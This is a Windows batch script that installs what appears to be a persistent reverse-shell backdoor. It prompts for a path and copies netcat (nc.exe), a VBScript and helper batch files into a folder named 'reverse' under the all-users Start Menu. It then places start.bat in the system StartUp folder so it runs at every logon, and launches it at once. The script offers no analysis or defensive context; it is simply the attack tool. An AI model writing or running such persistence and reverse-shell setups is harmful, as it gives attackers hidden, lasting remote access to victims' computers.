set /p x=path:
mkdir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse"
copy "%x%\1.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
copy "%x%\2.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
copy "%x%\nc.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
copy "%x%\start.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start.bat"
pause
